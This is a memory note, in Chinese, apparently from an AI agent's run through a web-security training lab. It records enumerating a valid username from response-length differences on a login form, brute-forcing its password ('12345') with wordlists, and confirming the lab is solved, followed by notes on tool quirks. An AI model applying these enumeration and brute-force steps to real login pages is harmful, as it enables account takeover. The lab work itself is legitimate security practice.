---
metadata:
  node_type: memory
name: "PRS arm A username-enumeration-via-different-responses"
description: "arm A 基线:lab-username-enumeration-via-different-responses 冷实例(reused:false)一次通过 - 用户名 ec2-user 由响应体差异 3246 vs 3244(「Incorrect password」/「Invalid username」)判出,口令 12345 由 302→/my-account?id=ec2-user 判出,banner solved"
last_updated: 2026-10-08T19:48:38+08:00
created: 2026-10-08T19:48:38+08:00
---

## 2026-10-08 arm A 基线:lab-username-enumeration-via-different-responses

- 题面:登录口枚举有效用户名,再爆破该用户口令,进账户页。
- 实例:`range_launch bb33e208…d29c8 --jar /tmp/cj1.json` → `reused:false`,实例 `https://0aee006c04f4769d80bed0dd00a1002f.web-security-academy.net/`;首触 banner `is-notsolved`,故本记录为真跃迁。
- 登录页无 CSRF 字段,表单 `POST /login` 仅 `username` + `password`;jar 用独立 `/tmp/ue_jar.json`。
- 词表:官方 `auth-lab-usernames` / `auth-lab-passwords` → `doc_read` 出 markdown(单行反引号内空格分隔)→ `text_sub ' ' ','` 转逗号列形式后直接喂 `form_sweep` 的 values 参数(件不接受 @file)。
- 枚举:[件] `form_sweep /login username <101 值> --field password=wrongpass123` → 100 个 3244 字节、唯一 `ec2-user` 3246;单发复核:3246 = `<p class=is-warning>Incorrect password</p>`,3244 = `Invalid username` ⇒ 用户名 = `ec2-user`。
- 爆破:[件] `form_sweep /login password <100 值> --field username=ec2-user` → `12345` 回 `302 Location: /my-account?id=ec2-user` + 新 session cookie,其余 200。
- 收口:[件] `http_session post /login --form username=ec2-user --form password=12345 --follow` 落到 `/my-account?id=ec2-user`(页面显示 `Your username is: ec2-user`);`banner_verdict` → `solved:true`,`Congratulations, you solved the lab!`。
- 坑/发现一:`form_sweep` 信封只有逐值 results,没有 baseline/outlier 摘要,2 字节级差异要自己看 len 列(与我另一批里 header_scan/url_fuzz 的 outliers 输出不一致);两轮共 201 次 POST 各约 133 s,顺序投递,时间预算按 1.4 值/秒估。
- 坑/发现二:`doc_read` 对词表页只把列表塞在单行反引号里(markdown_chars 约 11 k),`page_read` 的 description 字段会把该列表截断到约 300 字,取全量要用 doc_read/read 而非 page_read。

